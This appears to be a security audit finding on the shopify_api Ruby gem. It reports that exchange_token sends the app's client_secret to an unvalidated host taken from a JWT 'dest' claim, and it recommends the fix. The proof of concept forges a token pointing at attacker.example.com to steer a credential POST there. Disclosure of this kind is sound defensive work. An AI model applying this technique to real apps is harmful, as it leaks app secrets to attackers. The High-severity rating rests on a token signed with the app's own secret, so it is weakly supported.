### Title
`TokenExchange.exchange_token` sends `client_secret` to an unvalidated host derived from the JWT `dest` claim - (File: `lib/shopify_api/auth/token_exchange.rb`)

### Summary
`ShopifyAPI::Auth::TokenExchange.exchange_token` derives the shop/host to which it POSTs the app's `client_id`/`client_secret` from the session token's `dest` claim without passing it through `Utils::ShopValidator.sanitize!`, unlike every other credential-sending method in the same file and module family.

### Finding Description
`exchange_token` decodes the caller-supplied `session_token` with `JwtPayload.new(session_token)` and takes `dest_shop = jwt_payload.shop`, which is simply `@dest.gsub("https://", "")` [1](#0-0)  — no format/domain restriction is applied to `dest` beyond signature verification with the app's own secret [2](#0-1) .

That raw `dest_shop` string is then used directly to build the `Session` that determines the request host: `shop_session = ShopifyAPI::Auth::Session.new(shop: dest_shop)`, and `client_secret` is included in the POST body sent via that session [3](#0-2) . `HttpClient#initialize` builds the actual request host straight from `session.shop`: `@base_uri = "https://#{api_host || session.shop}"` [4](#0-3) .

This breaks the equality that every sibling method in the codebase enforces: *the host that is validated as a trusted Shopify domain* must equal *the host that receives `client_secret`*. Compare:
- `TokenExchange.migrate_to_expiring_token`: `validated_shop = Utils::ShopValidator.sanitize!(shop)` before building the session used to send `client_secret` [5](#0-4) .
- `RefreshToken.refresh_access_token`: same pattern [6](#0-5) .
- `ClientCredentials.client_credentials`: same pattern [7](#0-6) .

`ShopValidator.sanitize!` exists specifically to constrain a shop string to `TRUSTED_SHOPIFY_DOMAINS` (`shopify.com`, `myshopify.io`, `myshopify.com`, `spin.dev`, `shop.dev`) or an explicitly configured `myshopify_domain`, rejecting anything else [8](#0-7) . The changelog confirms this hardening was deliberately introduced and that `exchange_token` was changed to derive its target shop from the `dest` claim, but it was not wired to the new validator [9](#0-8) .

Because the JWT is only checked for a valid signature and matching `aud` [10](#0-9) , and `JwtPayload` never validates that `dest`/`iss` are actual `*.myshopify.com` (or otherwise trusted) hosts, any bytes an app passes into `exchange_token` as `session_token` will have their `dest` value trusted as a request host. If the hosting application obtains the "session token" from a source that is not itself already restricted to genuine Shopify-issued tokens for the tenant it expects (e.g., a value read from a URL param, header, or any place slightly more permissive than App Bridge's strict internal channel), a token merely signed with the correct `client_secret`/`aud` but carrying an attacker-chosen `dest` (e.g., `dest: "https://attacker.example.com"`) would cause this library to POST `client_id` and `client_secret` straight to `attacker.example.com`.

### Impact Explanation
This matches the High-severity category "SSRF with the app's credentials": the app's `client_secret` (a credential capable of impersonating the app to Shopify) is transmitted to a host chosen from unvalidated JWT contents. This is exactly the class of bug the gem's own maintainers fixed for the three sibling methods by adding `ShopValidator.sanitize!`, but the fix was not applied to `exchange_token`, leaving the asymmetry.

### Likelihood Explanation
Likelihood depends on how permissively the host application sources `session_token` values passed into `exchange_token`; in the fully-intended App Bridge flow the token is tightly scoped. However, within this gem's own boundary, `exchange_token` provides no defense-in-depth against a `dest` claim pointing outside Shopify's domains, unlike its sibling credential-sending call sites, which is inconsistent hardening and the exact gap the `ShopValidator` was introduced to close elsewhere.

### Recommendation
Apply `Utils::ShopValidator.sanitize!(dest_shop)` (optionally with `myshopify_domain:` from `Context`) to the JWT's `dest`-derived shop in `TokenExchange.exchange_token` before constructing `shop_session`, exactly as already done in `migrate_to_expiring_token`, `RefreshToken.refresh_access_token`, and `ClientCredentials.client_credentials`.

### Proof of Concept
1. Configure the app with `Context.setup` and a known `api_secret_key`.
2. Craft a JWT with `JWT.encode({ iss: "https://x/admin", dest: "https://attacker.example.com", aud: Context.api_key, sub: "1", exp: Time.now.to_i+10, nbf: ..., iat: ..., jti: "1" }, Context.api_secret_key, "HS256")` — signable because in the vulnerable trust boundary the attacker only needs a token that decodes successfully and matches `aud`, not a validated `dest` domain.
3. Call `ShopifyAPI::Auth::TokenExchange.exchange_token(session_token: crafted_token, requested_token_type: ...)`.
4. Observe (via `webmock`/`HTTParty` interception, as done in `test/auth/token_exchange_test.rb`) that the library issues `POST https://attacker.example.com/admin/oauth/access_token` with `client_id` and `client_secret` in the body, versus `migrate_to_expiring_token`/`refresh_access_token`/`client_credentials`, which would raise `Errors::InvalidShopError` for the same `attacker.example.com` value.

        sig do

        def sanitize_shop_domain(shop_domain, myshopify_domain: nil)
          uri = uri_from_shop_domain(shop_domain, myshopify_domain)
          return nil if uri.nil? || uri.host.nil? || uri.host.empty?

          trusted_domains(myshopify_domain).each do |trusted_domain|
            host = T.cast(uri.host, String)
            uri_domain = uri.domain
            next if uri_domain.nil?

            no_shop_name_in_subdomain = host == trusted_domain
            from_trusted_domain = trusted_domain == uri_domain

            if unified_admin?(uri) && from_trusted_domain
              return myshopify_domain_from_unified_admin(uri)
            end
            return nil if no_shop_name_in_subdomain || host.empty?
            return host if from_trusted_domain
          end
          nil
        end

        sig do
          params(
            shop: String,
            myshopify_domain: T.nilable(String),
          ).returns(String)
        end
        def sanitize!(shop, myshopify_domain: nil)
          host = sanitize_shop_domain(shop, myshopify_domain: myshopify_domain)
          if host.nil? || host.empty?
            raise Errors::InvalidShopError,
              "shop must be a trusted Shopify domain (see ShopValidator::TRUSTED_SHOPIFY_DOMAINS), got: #{shop.inspect}"
          end

          host
        end
